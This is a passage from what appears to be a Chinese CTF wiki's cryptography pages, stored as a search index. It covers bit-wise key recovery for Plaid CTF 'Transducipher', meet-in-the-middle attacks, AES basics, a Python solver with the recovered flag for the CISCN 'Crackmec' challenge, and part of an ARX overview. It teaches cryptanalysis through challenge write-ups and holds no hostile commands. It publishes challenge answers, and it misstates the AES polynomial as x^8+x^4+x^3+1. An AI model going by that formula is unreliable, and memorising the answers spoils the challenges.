T \u6709\u5173\u3002</li> </ol> <p>\u901a\u8fc7\u8fdb\u4e00\u6b65\u5730\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u51fd\u6570\u90fd\u662f\u53ef\u9006\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u6700\u540e\u7684\u5bc6\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u5c06\u539f\u6765\u7684\u8f6e\u6570\u7f29\u77ed\u4e3a\u5dee\u4e0d\u591a 5 \u8f6e\uff0c\u56e0\u4e3a\u6700\u540e\u4e00\u8f6e\u7684 <code>transduce</code> \u548c<code>swap</code> \u6ca1\u6709\u4f5c\u7528\u4e86\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u5982\u4e0b\u53d8\u91cf</p> \u540d\u5b57 \u542b\u4e49 k_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u9ad8 32 \u4f4d k_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u4f4e 32 \u4f4d d_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u9ad8 32 \u4f4d d_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u4f4e 32 \u4f4d <p>\u7531\u4e8e\u5176\u4e2d\u6709\u4e00\u4e2a\u6838\u5fc3\u64cd\u4f5c\u662f swap\uff0c\u53ea\u4f1a\u64cd\u7eb5\u9ad8\u6216\u4f4e 32 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\u8003\u8651\u3002\u7b80\u5316\u5b9a\u4e49\u5982\u4e0b</p> <ul> <li>Transduce \u7b80\u5316\u4e3a T\uff0c\u8fd9\u91cc\u867d\u7136\u4e0e\u6e90\u4ee3\u7801\u91cc\u51b2\u7a81\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u6682\u65f6\u7406\u89e3\u4e00\u4e0b\u3002</li> <li>Swap \u7b80\u5316\u4e3a S\u3002</li> </ul> <p>\u5219\u6bcf\u4e00\u8f6e\u7684\u660e\u5bc6\u6587\uff0c\u5bc6\u94a5\u5982\u4e0b</p> \u8f6e\u6570 \u5de6\u4fa7\u5bc6\u94a5 \u5de6\u4fa7\u5bc6\u6587 \u53f3\u4fa7\u5bc6\u94a5 \u53f3\u4fa7\u5bc6\u6587 0 k_{0,0} d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) k_{0,1} d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) 1 k_{1,0}=T(k_{0,1},s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) k_{1,1}=T(k_{0,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) 2 k_{2,0}=T(k_{1,1},s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) k_{2,1}=T(k_{1,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) 3 k_{3,0}=T(k_{2,1},s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) k_{3,1}=T(k_{2,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) 4 k_{4,0}=T(k_{3,1},s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) k_{4,1}=T(k_{3,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) 5 k_{5,0}=T(k_{4,1},s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) k_{5,1}=T(k_{4,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) <p>\u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u9010\u6bd4\u7279\u4f4d\u679a\u4e3e k \u7684\u9ad8 32 \u4f4d\uff0c\u540c\u65f6\u679a\u4e3e\u5728\u8fdb\u884c T \u64cd\u4f5c\u65f6\u7684\u53ef\u80fd\u7684 s \u72b6\u6001\u4f4d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u83b7\u53d6\u9ad8 32 \u4f4d\u5bc6\u94a5\u3002\u5728\u8fdb\u884c\u9010\u4f4d\u7206\u7834\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u83b7\u53d6\u4e24\u4e2a\u53ef\u80fd\u7ed3\u679c</p> <pre><code>[2659900894, 2659900895]\n</code></pre> <p>\u518d\u6839\u636e\u5de6\u8fb9\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u53bb\u83b7\u53d6\u53f3\u8fb9\u53ef\u80fd\u7684\u7ed3\u679c\uff0c\u5229\u7528 2659900894 \u83b7\u53d6\u7684\u53ef\u80fd\u7684\u7ed3\u679c\u5982\u4e0b</p> <pre><code># \u7b2c\u4e00\u7ec4\u660e\u5bc6\u6587\u5bf9\u5bf9\u5e94\u7684\u5bc6\u94a5\u53ef\u80fd\u592a\u591a\u3002\n# \u7b2c\u4e8c\u7ec4\u4e00\u5171 6 \u4e2a\u3002\n[2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155]\n# \u7b2c\u4e09\u7ec4\n[2764038144, 2764038145]\n</code></pre> <p>\u7136\u540e\u5176\u5b9e\u6211\u4eec\u5c31\u53ef\u4ee5\u624b\u5de5\u8bd5\u4e00\u4e0b\u52a0\u5bc6\u6240\u6709\u7684\u660e\u5bc6\u6587\uff0c\u5982\u679c\u4e0d\u5bf9\uff0c\u5c31\u76f4\u63a5\u5224\u65ad\u9519\u8bef\u5373\u53ef\u4e86\u3002\u8fd9\u6837\u5176\u5b9e\u53ef\u4ee5\u5f88\u5feb\u53ef\u4ee5\u8fc7\u6ee4\u3002\u6700\u540e\u53ef\u4ee5\u53d1\u73b0\u5bc6\u94a5\u662f</p> <pre><code>2659900894|2764038145\n</code></pre> <p>\u4e5f\u5c31\u662f11424187353095200769\u3002\u4e5f\u5c31\u62ff\u5230\u4e86 flag\u3002</p> <p>\u5f53\u7136\uff0c\u672c\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5206\u522b\u679a\u4e3e\u7b2c 0 \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u548c\u6700\u540e\u4e00\u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u4f7f\u5176\u5728\u7b2c\u4e09\u8f6e\u76f8\u9047\u4ea7\u751f\u78b0\u649e\u3002</p>"},{"location":"crypto/attack-summary/bit-attack/#_3","title":"\u53c2\u8003","text":"<ul> <li>http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/</li> </ul>"},{"location":"crypto/attack-summary/meet-in-the-middle/","title":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb - MITM","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/attack-summary/meet-in-the-middle/#_1","title":"\u6982\u8ff0","text":"<p>\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u662f\u4e00\u79cd\u4ee5\u7a7a\u95f4\u6362\u53d6\u65f6\u95f4\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u6cd5\uff0c1977\u5e74\u7531 Diffie \u4e0e Hellman \u63d0\u51fa\u3002\u4ece\u4e2a\u4eba\u89d2\u5ea6\u770b\uff0c\u8005\u66f4\u591a\u5730\u6307\u4e00\u79cd\u601d\u60f3\uff0c\u4e0d\u4ec5\u4ec5\u9002\u7528\u4e8e\u5bc6\u7801\u5b66\u653b\u51fb\uff0c\u4e5f\u9002\u7528\u4e8e\u5176\u4ed6\u65b9\u9762\uff0c\u53ef\u4ee5\u964d\u4f4e\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u3002</p> <p>\u57fa\u672c\u539f\u7406\u5982\u4e0b</p> <p>\u5047\u8bbe E \u548c D \u5206\u522b\u662f\u52a0\u5bc6\u51fd\u6570\u548c\u89e3\u5bc6\u51fd\u6570\uff0ck1 \u548c k2 \u5206\u522b\u662f\u4e24\u6b21\u52a0\u5bc6\u4f7f\u7528\u7684\u5bc6\u94a5\uff0c\u5219\u6211\u4eec\u6709</p> <p>C=E_{k_2}(E_{k_1}(P))</p> <p>P=D_{k_2}(D_{k_1}(C))</p> <p>\u5219\u6211\u4eec\u53ef\u4ee5\u63a8\u51fa</p> <p>E_{k_1}(P)=D_{k_2}(C)</p> <p>\u90a3\u4e48\uff0c\u5f53\u7528\u6237\u77e5\u9053\u4e00\u5bf9\u660e\u6587\u548c\u5bc6\u6587\u65f6</p> <ol> <li>\u653b\u51fb\u8005\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 k1\uff0c\u5c06 P \u6240\u6709\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5b58\u50a8\u8d77\u6765\uff0c\u5e76\u6309\u7167\u5bc6\u6587\u7684\u5927\u5c0f\u8fdb\u884c\u6392\u5e8f\u3002</li> <li>\u653b\u51fb\u8005\u8fdb\u4e00\u6b65\u679a\u4e3e\u6240\u6709\u7684k2\uff0c\u5c06\u5bc6\u6587 C \u8fdb\u884c\u89e3\u5bc6\u5f97\u5230 C1\uff0c\u5728\u7b2c\u4e00\u6b65\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4e2d\u641c\u7d22 C1\uff0c\u5982\u679c\u641c\u7d22\u5230\uff0c\u5219\u6211\u4eec\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u627e\u5230\u4e86\u6b63\u786e\u7684 k1 \u548c  k2\u3002</li> <li>\u5982\u679c\u89c9\u5f97\u7b2c\u4e8c\u6b65\u4e2d\u5f97\u5230\u7684\u7ed3\u679c\u4e0d\u4fdd\u9669\uff0c\u5219\u6211\u4eec\u8fd8\u53ef\u4ee5\u518d\u627e\u4e00\u4e9b\u660e\u5bc6\u6587\u5bf9\u8fdb\u884c\u9a8c\u8bc1\u3002</li> </ol> <p>\u5047\u8bbe k1 \u548c k2 \u7684\u5bc6\u94a5\u957f\u5ea6\u90fd\u4e3a n\uff0c\u5219\u539f\u5148\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u9700\u8981 O(n^2)\uff0c\u73b0\u5728\u6211\u4eec\u53ea\u9700\u8981 O(n log_2n)\u3002</p> <p>\u8fd9\u4e0e 2DES \u7684\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7c7b\u4f3c\u3002</p>"},{"location":"crypto/attack-summary/meet-in-the-middle/#_2","title":"\u9898\u76ee","text":"<ul> <li>2018 \u56fd\u8d5b Crackmec\uff0c\u53c2\u89c1 Wiki AES \u90e8\u5206</li> <li>2018 Plaid CTF Transducipher\uff0c\u53c2\u89c1\u6bd4\u7279\u653b\u51fb\u90e8\u5206\u7684\u539f\u7406\u3002</li> <li>2018 \u56fd\u8d5b Crackme java\uff0c\u53c2\u89c1 Wiki \u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570\u90e8\u5206</li> <li>2018 WCTF RSA\uff0c\u53c2\u89c1 wiki RSA Complex \u90e8\u5206</li> </ul>"},{"location":"crypto/attack-summary/meet-in-the-middle/#_3","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A</li> </ul>"},{"location":"crypto/basic/introduction/","title":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u672c\u90e8\u5206\u4f1a\u4ecb\u7ecd\u201c\u57fa\u7840\u6570\u5b66\u77e5\u8bc6\u201d\uff0c\u8fd9\u91cc\u52a0\u4e86\u5f15\u53f7\uff0c\u6240\u4ee5\u5e76\u4e0d\u89c1\u5f97\u771f\u7684\u5f88\u57fa\u7840\u3002\u3002</p>"},{"location":"crypto/blockcipher/aes/","title":"AES","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/blockcipher/aes/#_1","title":"\u57fa\u672c\u4ecb\u7ecd","text":"<p>Advanced Encryption Standard\uff08AES\uff09\uff0c\u9ad8\u7ea7\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u88ab\u8bbe\u8ba1\u6765\u53d6\u4ee3 DES\uff0c\u7531 Joan Daemen \u548c Vincent Rijmen \u6240\u8bbe\u8ba1\u3002\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b</p> <ul> <li>\u8f93\u5165\uff1a128 \u6bd4\u7279\u3002</li> <li>\u8f93\u51fa\uff1a128 \u6bd4\u7279\u3002</li> <li>SPN \u7f51\u7edc\u7ed3\u6784\u3002</li> </ul> <p>\u5176\u8fed\u4ee3\u8f6e\u6570\u4e0e\u5bc6\u94a5\u957f\u5ea6\u6709\u5173\u7cfb\uff0c\u5982\u4e0b</p> \u5bc6\u94a5\u957f\u5ea6\uff08\u6bd4\u7279\uff09 \u8fed\u4ee3\u8f6e\u6570 128 10 192 12 256 14"},{"location":"crypto/blockcipher/aes/#_2","title":"\u57fa\u672c\u6d41\u7a0b","text":""},{"location":"crypto/blockcipher/aes/#_3","title":"\u57fa\u672c\u6982\u5ff5","text":"<p>\u5728 AES \u52a0\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e00\u5757\u90fd\u662f 128 \u6bd4\u7279\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u660e\u786e\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u3002</p> <p></p> <p>\u5728 AES \u4e2d\uff0c\u5757\u4e0e State \u4e4b\u95f4\u7684\u8f6c\u6362\u8fc7\u7a0b\u5982\u4e0b</p> <p></p> <p>\u6240\u4ee5\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e00\u4e2a block \u4e2d\u7684\u5b57\u8282\u662f\u6309\u7167\u5217\u6392\u5217\u8fdb\u5165\u5230\u72b6\u6001\u6570\u7ec4\u7684\u3002</p> <p>\u800c\u5bf9\u4e8e\u660e\u6587\u6765\u8bf4\uff0c\u4e00\u822c\u6211\u4eec\u4f1a\u9009\u62e9\u4f7f\u7528\u5176\u5341\u516d\u8fdb\u5236\u8fdb\u884c\u7f16\u7801\u3002</p> <p></p>"},{"location":"crypto/blockcipher/aes/#_4","title":"\u52a0\u89e3\u5bc6\u8fc7\u7a0b","text":"<p>\u8fd9\u91cc\u7ed9\u4e2a\u770b\u96ea\u4e0a\u6bd4\u8f83\u597d\u7684 \u56fe\u4f8b \uff0c\u4ee5\u4fbf\u4e8e\u4ecb\u7ecd\u57fa\u672c\u7684\u6d41\u7a0b\uff0c\u6bcf\u4e00\u8f6e\u4e3b\u8981\u5305\u62ec</p> <ul> <li>\u8f6e\u5bc6\u94a5\u52a0\uff0cAddRoundKey</li> <li>\u5b57\u8282\u66ff\u6362\uff0cSubBytes</li> <li>\u884c\u79fb\u4f4d\uff0cShiftRows</li> <li>\u5217\u6df7\u6dc6\uff0cMixColumns</li> </ul> <p></p> <p>\u4e0a\u9762\u7684\u5217\u6df7\u6dc6\u7684\u77e9\u9635\u4e58\u6cd5\u7b49\u53f7\u5de6\u8fb9\u7684\u5217\u5411\u91cf\u5e94\u8be5\u5728\u53f3\u8fb9\u3002</p> <p>\u8fd9\u91cc\u518d\u7ed9\u4e00\u5f20\u5176\u52a0\u89e3\u5bc6\u7684\u5168\u56fe\uff0c\u5176\u89e3\u5bc6\u7b97\u6cd5\u7684\u6b63\u786e\u6027\u5f88\u663e\u7136\u3002</p> <p></p> <p>\u6211\u4eec\u8fd9\u91cc\u91cd\u70b9\u5173\u6ce8\u4e00\u4e0b\u4ee5\u4e0b\u3002</p>"},{"location":"crypto/blockcipher/aes/#_5","title":"\u5b57\u8282\u66ff\u6362","text":"<p>\u5728\u5b57\u8282\u66ff\u6362\u7684\u80cc\u540e\uff0c\u5176\u5b9e\u662f\u6709\u5bf9\u5e94\u7684\u6570\u5b66\u89c4\u5219\u6765\u5b9a\u4e49\u5bf9\u5e94\u7684\u66ff\u6362\u8868\u7684\uff0c\u5982\u4e0b</p> <p></p> <p>\u8fd9\u91cc\u7684\u8fd0\u7b97\u5747\u5b9a\u4e49\u5728 GF(2^8) \u5185\u3002</p>"},{"location":"crypto/blockcipher/aes/#_6","title":"\u5217\u6df7\u6dc6","text":"<p>\u8fd9\u91cc\u7684\u8fd0\u7b97\u4e5f\u662f\u5b9a\u4e49\u5728 GF(2^8) \u4e0a\uff0c\u4f7f\u7528\u7684\u6a21\u591a\u9879\u5f0f\u4e3a x^8+x^4+x^3+1\u3002</p>"},{"location":"crypto/blockcipher/aes/#_7","title":"\u5bc6\u94a5\u6269\u5c55","text":""},{"location":"crypto/blockcipher/aes/#_8","title":"\u7b49\u4ef7\u89e3\u5bc6\u7b97\u6cd5","text":"<p>\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0</p> <ul> <li>\u4ea4\u6362\u9006\u5411\u884c\u79fb\u4f4d\u548c\u9006\u5411\u5b57\u8282\u4ee3\u66ff\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\u3002</li> <li>\u4ea4\u6362\u8f6e\u5bc6\u94a5\u52a0\u548c\u9006\u5411\u5217\u6df7\u6dc6\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\uff0c\u5173\u952e\u5728\u4e8e</li> <li>\u9996\u5148\u53ef\u4ee5\u628a\u5f02\u6216\u770b\u6210\u57df\u4e0a\u7684\u591a\u9879\u5f0f\u52a0\u6cd5</li> <li>\u7136\u540e\u591a\u9879\u5f0f\u4e2d\u4e58\u6cd5\u5bf9\u52a0\u6cd5\u5177\u6709\u5206\u914d\u7387\u3002</li> </ul>"},{"location":"crypto/blockcipher/aes/#_9","title":"\u653b\u51fb\u65b9\u6cd5","text":"<ul> <li>\u79ef\u5206\u653b\u51fb</li> </ul>"},{"location":"crypto/blockcipher/aes/#2018-crackmec","title":"2018 \u56fd\u8d5b Crackmec","text":"<p>\u901a\u8fc7\u7b80\u5355\u5206\u6790\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7b97\u6cd5\u662f\u4e00\u4e2a\u7b80\u5316\u7248\u7684 AES\uff0c\u5176\u57fa\u672c\u64cd\u4f5c\u4e3a</p> <ul> <li>9 \u8f6e\u8fed\u4ee3<ul> <li>\u884c\u79fb\u4f4d</li> <li>\u53d8\u79cd\u5b57\u8282\u66ff\u6362</li> </ul> </li> </ul> <p>\u5982\u4e0b</p> <pre><code>  memcpy(cipher, plain, 0x10uLL);\nfor ( i = 0LL; i &lt;= 8; ++i )\n{\nshift_row(cipher);\nfor ( j = 0LL; j &lt;= 3; ++j )\n*(_DWORD *)&amp;cipher[4 * j] =\nbox[((4 * j + 3 + 16 * i) &lt;&lt; 8) + (unsigned __int8)cipher[4 * j + 3]] ^\nbox[((4 * j + 2 + 16 * i) &lt;&lt; 8) + (unsigned __int8)cipher[4 * j + 2]] ^\nbox[((4 * j + 1 + 16 * i) &lt;&lt; 8) + (unsigned __int8)cipher[4 * j + 1]] ^\nbox[((4 * j + 16 * i) &lt;&lt; 8) + (unsigned __int8)cipher[4 * j]];\n}\nresult = shift_row(cipher);\nfor ( k = 0LL; k &lt;= 0xF; ++k )\n{\nresult = subbytes[256 * k + (unsigned __int8)cipher[k]];\ncipher[k] = result;\n}\nreturn result;\n</code></pre> <p>\u6839\u636e\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u6211\u4eec\u5df2\u77e5\u7a0b\u5e8f\u52a0\u5bc6\u7684\u7ed3\u679c\uff0c\u800c subbytes \u548c shift_row \u53c8\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u6700\u540e\u4e00\u8f6e\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 box \u5bf9\u5e94\u7684\u5e38\u6570\uff0c\u6211\u4eec\u53ea\u662f\u4e0d\u77e5\u9053\u4e0a\u4e00\u8f6e\u4e2d <code>cipher[4*j]</code> \u5bf9\u5e94\u7684\u503c\uff0c\u4e00\u5171 32 \u4f4d\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u7206\u7834\u7684\u8bdd\uff0c\u663e\u7136\u4e0d\u53ef\u53d6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u8f6e\u90fd\u9700\u8981\u8fd9\u4e48\u7206\u7834\uff0c\u65f6\u95f4\u4e0d\u53ef\u63a5\u53d7\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u5176\u5b83\u529e\u6cd5\u5462\uff1f\u5176\u5b9e\u6709\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u5373\u9996\u5148\u679a\u4e3e\u6240\u6709\u7684 <code>cipher[4*j]</code> \u4e0e<code>cipher[4*j+1]</code> \u7684\u5b57\u8282\u7ec4\u5408\uff0c\u4e00\u5171256*256 \u79cd\u3002\u5728\u679a\u4e3e\u5269\u4e0b\u4e24\u4e2a\u5b57\u8282\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u8ba1\u7b97\u51fa\u5176\u4e0e\u5bc6\u6587\u7684\u5f02\u6216\u503c\uff0c\u7136\u540e\u53bb\u4e4b\u524d\u7684\u7ec4\u5408\u4e2d\u627e\uff0c\u5982\u679c\u627e\u5230\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u8fd9\u6837\u590d\u6742\u5ea6\u77ac\u95f4\u964d\u5230 O(2^{16})\u3002</p> <p>\u4ee3\u7801\u5982\u4e0b</p> <pre><code>encflag = [\n    0x16, 0xEA, 0xCA, 0xCC, 0xDA, 0xC8, 0xDE, 0x1B, 0x16, 0x03, 0xF8, 0x84,\n    0x69, 0x23, 0xB2, 0x25\n]\nsubbytebox = eval(open('./subbytes').read())\nbox = eval(open('./box').read())\nprint subbytebox[-1], box[-1]\n\n\ndef inv_shift_row(now):\n    tmp = now[13]\n    now[13] = now[9]\n    now[9] = now[5]\n    now[5] = now[1]\n    now[1] = tmp\n\n    tmp = now[10]\n    now[10] = now[2]\n    now[2] = tmp\n    tmp = now[14]\n    now[14] = now[6]\n    now[6] = tmp\n\n    tmp = now[15]\n    now[15] = now[3]\n    now[3] = now[7]\n    now[7] = now[11]\n    now[11] = tmp\n\n    return now\n\n\ndef byte2num(a):\n    num = 0\n    for i in range(3, -1, -1):\n        num = num * 256\n        num += a[i]\n    return num\n\n\ndef getbytes(i, j, target):\n\"\"\"\n    box[((4 * j + 3 + 16 * i) &lt;&lt; 8) + a2[4 * j + 3]]\n    box[((4 * j + 2 + 16 * i) &lt;&lt; 8 )+ a2[4 * j + 2]]\n    box[((4 * j + 1 + 16 * i) &lt;&lt; 8) + a2[4 * j + 1]]\n    box[((4 * j + 16 * i) &lt;&lt; 8) + a2[4 * j]];\n    \"\"\"\n    box01 = dict()\n    for c0 in range(256):\n        for c1 in range(256):\n            num0 = ((4 * j + 16 * i) &lt;&lt; 8) + c0\n            num1 = ((4 * j + 1 + 16 * i) &lt;&lt; 8) + c1\n            num = box[num0] ^ box[num1]\n            box01[num] = (c0, c1)\n    for c2 in range(256):\n        for c3 in range(256):\n            num2 = ((4 * j + 2 + 16 * i) &lt;&lt; 8) + c2\n            num3 = ((4 * j + 3 + 16 * i) &lt;&lt; 8) + c3\n            num = box[num2] ^ box[num3]\n            calc = num ^ target\n            if calc in box01:\n                c0, c1 = box01[calc]\n                return c0, c1, c2, c3\n    print 'not found'\n    print i, j, target, calc\n    exit(0)\n\n\ndef solve():\n    a2 = [0] * 16\n\"\"\"\n      for ( k = 0LL; k &lt;= 0xF; ++k )\n      {\n        result = subbytesbox[256 * k + a2[k]];\n        a2[k] = result;\n      }\n    \"\"\"\n    for i in range(15, -1, -1):\n        tag = 0\n        for j in range(256):\n            if subbytebox[256 * i + j] == encflag[i]:\n                # j = a2[k]\n                tag += 1\n                a2[i] = j\n                if tag == 2:\n                    print 'two number', i\n                    exit(0)\n\"\"\"\n      result = shift_row(a2);\n    \"\"\"\n    a2 = inv_shift_row(a2)\n\"\"\"\n      for ( i = 0LL; i &lt;= 8; ++i )\n      {\n        shift_row(a2);\n        for ( j = 0LL; j &lt;= 3; ++j )\n          *(_DWORD *)&amp;a2[4 * j] = box[((4 * j + 3 + 16 * i) &lt;&lt; 8) + a2[4 * j + 3]] ^ box[((4 * j + 2 + 16 * i) &lt;&lt; 8)\n                                                                                       + a2[4 * j + 2]] ^ box[((4 * j + 1 + 16 * i) &lt;&lt; 8) + a2[4 * j + 1]] ^ box[((4 * j + 16 * i) &lt;&lt; 8) + a2[4 * j]];\n      }\n    \"\"\"\n    for i in range(8, -1, -1):\n        tmp = [0] * 16\n        print 'round ', i\n        for j in range(0, 4):\n            num = byte2num(a2[4 * j:4 * j + 4])\n            #print num, a2[4 * j:4 * j + 4]\n            tmp[4 * j\n               ], tmp[4 * j + 1], tmp[4 * j + 2], tmp[4 * j + 3] = getbytes(\n                   i, j, num\n               )\n        a2 = inv_shift_row(tmp)\n    print a2\n    print ''.join(chr(c) for c in a2)\n\n\nif __name__ == \"__main__\":\n    solve()\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c</p> <pre><code>\u279c  cracemec git:(master) \u2717 python exp.py\n211 3549048324\nround  8\nround  7\nround  6\nround  5\nround  4\nround  3\nround  2\nround  1\nround  0\n[67, 73, 83, 67, 78, 98, 35, 97, 100, 102, 115, 64, 70, 122, 57, 51]\nCISCNb#adfs@Fz93\n</code></pre>"},{"location":"crypto/blockcipher/aes/#_10","title":"\u9898\u76ee","text":"<ul> <li>2018 \u5f3a\u7f51\u676f \u51b3\u8d5b revolver</li> </ul>"},{"location":"crypto/blockcipher/aes/#_11","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86</li> <li>Cryptography and Network Security\uff0c Advanced Encryption Standard  ppt</li> </ul>"},{"location":"crypto/blockcipher/arx-operations/","title":"ARX: Add-Rotate-Xor","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/blockcipher/arx-operations/#_1","title":"\u6982\u8ff0","text":"<p>ARX \u8fd0\u7b97\u662f\u5982\u4e0b 3 \u79cd\u57fa\u672c\u8fd0\u7b97\u7684\u7edf\u79f0 - Add \u6709\u9650\u57df\u4e0a\u7684\u6a21\u52a0 - Rotate \u5faa\u73af\u79fb\u4f4d - Xor \u5f02\u6216</p> <p>\u6709\u8bb8\u591a\u5e38\u89c1\u7684\u5757\u52a0\u5bc6\u7b97\u6cd5\u5728\u8f6e\u51fd\u6570\u4e2d\u53ea\u7528\u5230\u4e86\u8fd9 3 \u79cd\u57fa\u672c\u8fd0\u7b97\uff0c\u5178\u578b\u4f8b\u5b50\u5982 Salsa20\u3001Speck \u7b49\u3002\u53e6\u5916 IDEA \u4e5f\u91c7\u7528\u4e86\u7c7b\u4f3c\u7684\u57fa\u672c\u8fd0\u7b97\u6765\u6784\u5efa\u52a0\u89e3\u5bc6\u64cd\u4f5c\uff0c\u4e0d\u8fc7\u4ee5\u4e58\u6cd5\u4ee3\u66ff\u4e86\u79fb\u4f4d\u3002</p>"},{"location":"crypto/blockcipher/arx-operations/#_2","title":"\u4f18\u7f3a\u70b9","text":""},{"location":"crypto/blockcipher/arx-operations/#_3","title":"\u4f18\u70b9","text":"<ul> <li>\u64cd\u4f5c\u7b80\u5355\uff0c\u8fd0\u7b97\u901f\u5ea6\u5feb</li> <li>\u6267\u884c\u65f6\u95f4\u4e3a\u5e38\u6570\uff0c\u53ef\u4ee5\u907f\u514d\u57fa\u4e8e\u65f6\u95f4\u7684\u6d4b\u4fe1\u9053\u653b\u51fb</li> <li>\u7ec4\u5408\u540e\u7684\u51fd\u6570\u8868\u8fbe\u80fd\u529b\u8db3\u591f\u5f3a\uff08\u53c2\u89c1\u4e0b\u65b9\u4f8b\u9898\uff09</li> </ul>"},{"location":"crypto/blockcipher/arx-operations/#_4","title":"\u7f3a\u70b9","text":"<ul> <li>\u5728\u4e09\u79cd\u57fa\u672c\u8fd0\u7b97\u5f53\u4e2d\uff0cRotate\u3001Xor \u5bf9\u4e8e\u5355\u4e2a bit \u6765\u8bf4\u5747\u662f\u5b8c\u5168\u7ebf\u6027\u7684\u8fd0\u7b97\uff0c\u53ef\u80fd\u4f1a\u5e26\u6765\u4e00\u5b9a\u7684\u8106\u5f31\u6027(\u53c2\u89c1Rotational cryptanalysis)</li> 